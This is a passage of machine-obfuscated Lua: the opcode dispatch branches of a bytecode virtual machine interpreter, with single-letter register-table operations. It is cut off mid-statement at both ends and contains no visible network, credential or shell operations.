g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]m,l=i(c[g](c[g+1]))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))else local d=a[2];local b=c[a[3]];c[d+1]=b;c[d]=b[a[4]];end;elseif g<=238 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>239 then local e;c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=k[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=243 then if g<=241 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];elseif g==242 then local g;local e;c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=244 then k[a[3]]=c[a[2]];elseif g>245 then c[a[2]]=c[a[3]];else local f=a[2];local d={};for a=1,#l do local a=l[a];for b=0,#a do local a=a[b];local e=a[1];local b=a[2];if e==c and b>=f then d[b]=e[b];a[1]=d;end;end;end;end;elseif g<=251 then if g<=248 then if g==247 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=249 then local o;local k;local l;local m,n;local j;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,n=i(c[g](f(c,g+1,a[3])))h=n+g-1 l=0;for a=g,h do l=l+1;c[a]=m[l];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];k=c[g]o=c[g+2];if(o>0)then if(k>c[g+1])then b=a[3];else c[g+3]=k;end elseif(k<c[g+1])then b=a[3];else c[g+3]=k;end elseif g==250 then c[a[2]]=(not c[a[3]]);else local e;e=a[2]c[e]=c[e](c[e+1])b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];b=a[3];end;elseif g<=254 then if g<=252 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];elseif g>253 then local g;local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];else local g;local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];b=b+1;a=d[b];f=a[2]c[f]=c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];end;elseif g<=255 then local j;local k;local l,m;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,m=i(c[g](f(c,g+1,a[3])))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))elseif g==256 then local f;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];f=c[a[3]];c[g+1]=f;c[g]=f[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]][a[3]]=c[a[4]];end;elseif g<=300 then if g<=278 then if g<=267 then if g<=262 then if g<=259 then if g>258 then local g;local f;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];else c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];end;elseif g<=260 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))elseif g==261 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else do return c[a[2]]end end;elseif g<=264 then if g==263 then local g;local f;local e;c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];f=c[e]g=c[e+2];if(g>0)then if(f>c[e+1])then b=a[3];else c[e+3]=f;end elseif(f<c[e+1])then b=a[3];else c[e+3]=f;end else if(c[a[2]]~=a[4])then b=b+1;else b=a[3];end;end;elseif g<=265 then local e;c[a[2]]=c[a[3]];b=b+1;a=d[b];e=a[2]c[e]=c[e](c[e+1])b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g==266 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=272 then if g<=269 then if g==268 then local k;local m,l;local j;local g;c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else local h;local g;g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];do return end;end;elseif g<=270 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g>271 then local a=a[2]c[a]=c[a](c[a+1])else c[a[2]][c[a[3]]]=c[a[4]];end;elseif g<=275 then if g<=273 then do return c[a[2]]end elseif g==274 then local i;local h;local 